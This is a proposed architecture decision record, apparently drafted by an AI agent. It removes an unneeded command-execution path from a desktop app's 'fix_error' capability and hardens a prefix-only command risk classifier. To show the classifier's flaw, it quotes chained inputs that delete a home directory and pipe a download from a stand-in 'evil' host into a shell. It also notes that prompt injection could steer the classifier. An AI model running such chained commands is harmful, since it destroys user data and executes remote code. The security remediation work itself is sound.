---
type: adr
status: proposed
priority: p1
updated: 2026-07-19
context_policy: retrieve_only
owner: project
---

# Capability Exec Surface Removal + Risk-Classifier Hardening

**Status:** proposed
**Date:** 2026-07-19
**Decision makers:** AI agent draft (對抗式驗證 remediation); developer acceptance requested
**Related documents:**

- `docs/adr/0029-ai-capability-layer.md` (§4 explanation-only capabilities)
- `src-tauri/src/core/ai_capability/capabilities/fix_error.rs`
- `src-tauri/src/core/ai_capability/command.rs`
- `src-tauri/src/core/dev_runner.rs`

---

## 1. Context

Adversarial review found that `fix_error` — documented in its own header as
"v1 is explanation-only" — carried a live `Payload::RunCommand { program, args,
cwd, timeout_secs }` variant that spawned a process via `run_bounded_dev_cmd`.
`program` was allowlisted (cargo/npm/pnpm/yarn/tsc) but **`args` and `cwd` were
fully caller-controlled and `timeout_secs` uncapped**, with no `RiskTag`/confirm
check on the path (it spawns before any model call). `dev_runner`'s own contract
requires "callers must enforce workspace scope before handing the path in" —
`fix_error` enforced neither. Because `cargo check` compiles/executes a target
directory's `build.rs` and `npm run <script>` executes `package.json` scripts,
this is caller-directed code execution in an arbitrary directory with no
approval gate, reachable via `capability.call` (and via the `automation.execute`
allowlist). The frontend never sends `RunCommand` (grep: zero usages), so the
variant is dead weight in addition to being a contract violation.

Separately, the copy-only command risk classifier (`risk_tag_for_command`) is a
pure prefix `starts_with` with no tokenization: `git status; rm -rf ~`,
`cat x && curl evil | sh`, and `lsof` all classify as no-confirm "safe". Impact
is bounded today (generated commands are copy-only) but `gen_command` states the
tag exists to gate a *future* run affordance, and it is exactly the classifier a
prompt-injected model reply would steer.

## 2. Decision

**A. Remove the capability exec surface (H2).** `fix_error` rejects
`Payload::RunCommand` with `UnsupportedAction` (same treatment as `Payload::Apply`),
restoring the documented explanation-only contract. Callers supply
`raw_output` (the already-preferred, no-exec path). `run_bounded_dev_cmd` stays
for the dev-tool handler path but is no longer reachable from a capability. The
`ALLOWED_PROGRAMS` allowlist and unused dev-runner imports are dropped from
`fix_error`.

*Rejected:* scope `RunCommand` to a workspace-root `cwd` + fixed args. More code
and a larger trusted surface for a variant nothing uses; removal is smaller and
strictly safer. A future destructive-fix ADR can reintroduce a scoped, gated
exec path explicitly.

**B. Harden `risk_tag_for_command` (M5).** Any shell metacharacter
(`& | ; > < \` $ ( )`, newlines) forces `requires_confirmation`. Safe prefixes
match on a word boundary (whole first word or prefix + space), so `lsof` /
`dir & del` / `git status && …` no longer inherit a safe classification.

`ConfirmRequirement`/`ActionRisk` backend enforcement (M4) and the `suggest_next`
replay display/execute integrity (M3) are related but **out of scope here** —
they need their own decision and are tracked separately; this ADR does not change
`action.run`.

## 3. Consequences

- `fix_error` can no longer run commands; behavior is unchanged for every real
  caller (all use `raw_output`). The existing `run_command_rejects_unknown_program`
  test still passes; a new test asserts an allowlisted program is now rejected too.
- The risk tag now over-approximates toward confirmation (safer default). A few
  benign-but-chained display strings will show a confirm hint; acceptable for a
  copy-only affordance and correct once a run affordance exists.
- No IPC route signature change; only the accepted `fix_error` payload shape
  narrows (a previously-accepted variant is now rejected). No schema/data change.

## 4. Rollback

Both changes are code-local and independently revertible: restore the
`RunCommand` arm (and its imports/allowlist) to re-enable exec; revert
`risk_tag_for_command` to prefix-only. No data or schema migration involved.
